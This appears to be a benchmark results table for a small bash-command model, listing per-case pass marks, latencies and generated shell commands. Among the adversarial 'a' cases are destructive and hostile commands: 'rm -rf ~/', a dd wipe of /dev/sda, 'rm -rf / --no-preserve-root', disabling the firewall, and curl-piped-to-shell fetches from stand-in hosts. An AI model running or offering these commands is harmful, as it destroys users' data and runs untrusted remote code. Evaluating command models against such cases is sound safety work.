# eval: llama-server / kitty-bash-0.5b (core-final-kitty)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 56/72 (78%)
- cold p50 81ms p95 238ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 78 | - | node -v && npm -v |
| u02 | ✓ | 44 | - | ls -lhS |
| u03 | ✓ | 47 | - | curl ifconfig.me |
| u04 | ✓ | 94 | - | ss -tlnp | grep :3000 |
| u05 | ✓ | 150 | - | du -sh . |
| u06 | ✓ | 150 | - | find . -name "*.log" -mtime -1 |
| u07 | ✓ | 81 | - | ps aux | grep node |
| u08 | ✓ | 51 | - | git status |
| u09 | ✓ | 67 | - | brew install ripgrep |
| u10 | ✓ | 72 | - | mkdir projects && cd projects |
| u11 | ✓ | 93 | - | tar -czvf archive.tar.gz folder |
| u12 | ✓ | 60 | - | env | grep PATH |
| u13 | ✗ | 97 | - | pkill -9 -f "node server.js" |
| u14 | ✓ | 90 | - | tail -n 20 /var/log/syslog |
| u15 | ✗ | 312 | - | command -v python3 >/dev/null 2>&1 && echo "python3 is installed" || echo "pytho |
| u16 | ✓ | 64 | - | brew update && brew outdated |
| u17 | ✓ | 84 | - | echo $SHELL $HOME |
| u18 | ✓ | 75 | - | git reset --soft HEAD~1 |
| u19 | ✗ | 203 | - | find ~ -type f -exec du -h {} + | sort -rh | head -n 5 |
| u20 | ✓ | 163 | - | free -m | awk '/Mem:/ {print $3" "$4}' |
| u21 | ✗ | 128 | - | find . -name "*.js" | xargs wc -l |
| u22 | ✗ | 61 | - | docker restart container-name |
| u23 | ✓ | 92 | - | chmod +x script.sh && ./script.sh |
| u24 | ✓ | 77 | - | grep -R "TODO" . |
| u25 | ✓ | 113 | - | curl -O https://example.com/file.zip |
| u26 | ✗ | 63 | - | sysctl hw.ncpu |
| u27 | ✓ | 113 | - | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 61 | - | rm -rf node_modules |
| u29 | ✓ | 61 | - | ss -tlnp |
| u30 | ✓ | 60 | - | unzip file.zip |
| u31 | ✓ | 87 | - | tail -f /var/log/syslog |
| u32 | ✓ | 39 | - | uptime |
| u33 | ✗ | 80 | - | find ~ -name ".bashrc" |
| u34 | ✓ | 65 | - | cat /etc/resolv.conf |
| u35 | ✓ | 59 | - | cp file.txt backup.txt |
| u36 | ✓ | 56 | - | mv old.txt new.txt |
| u37 | ✗ | 49 | - | du -h downloads |
| u38 | ✓ | 48 | - | npm list --global |
| u39 | ✓ | 66 | - | xdg-open . |
| u40 | ✗ | 80 | - | sudo killall -HUP systemd-networkd |
| a01 | ✓ | 52 | - | rm -rf ~/ |
| a02 | ✓ | 184 | - | sudo dd if=/dev/zero of=/dev/sda bs=4M count=1024 |
| a03 | ✗ | 65 | - | git push origin main |
| a04 | ✗ | 166 | - | curl -s https://sketchy.example.com/install.sh | sh |
| a05 | ✗ | 73 | - | pkill -9 |
| a06 | ✗ | 98 | - | sudo chmod 777 everything in root |
| a07 | ✓ | 105 | - | echo "source ~/Documents/my_script.sh" >> ~/.bashrc |
| a08 | ✓ | 94 | - | curl -s https://x.io/i | sh |
| a09 | ✓ | 168 | - | sudo chmod -R 755 / |
| a10 | ✓ | 197 | - | find /var/log -type f -mtime +30 -exec rm {} \; |
| a11 | ✗ | 73 | - | crontab -e |
| a12 | ✓ | 65 | - | git reset --hard HEAD |
| a13 | ✓ | 50 | - | brew uninstall node |
| a14 | ✓ | 58 | - | sudo ufw disable |
| a15 | ✓ | 61 | - | rm -f today.txt |
| a16 | ✓ | 89 | - | sudo apt-get autoremove |
| a17 | ✓ | 62 | - | rm -rf ~/ |
| a18 | ✗ | 344 | - | openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc -pass pass:hunter2 |
| a19 | ✓ | 126 | - | echo 'export PATH=$PATH:/usr/local/bin' >> ~/.zshrc |
| a20 | ✓ | 94 | - | sudo rm -rf / --no-preserve-root |
| u41 | ✓ | 142 | - | find ~ -size +100M |
| u42 | ✓ | 204 | - | echo 'hello world' > my notes.txt |
| u43 | ✓ | 118 | - | git log -5 --pretty=format:"%h %s" |
| u44 | ✓ | 98 | - | curl -s https://example.com | cat |
| u45 | ✓ | 157 | - | find . -type f | wc -l |
| u46 | ✓ | 364 | - | ifconfig | grep 'inet addr:' | awk '{print $2}' | cut -d ':' -f1 | head -1 |
| u47 | ✓ | 50 | - | df -h |
| u48 | ✓ | 36 | - | who |
| a21 | ✓ | 213 | - | (crontab -l ; echo "0 0 * * * rm -rf /tmp") | crontab - |
| a22 | ✓ | 238 | - | sudo ln -s $(readlink -f ~/myhome/etc/hosts) /etc/hosts |
| a23 | ✓ | 79 | - | find . -exec rm {} \; |
| a24 | ✗ | 91 | - | curl https://x.io/i.sh | bash |
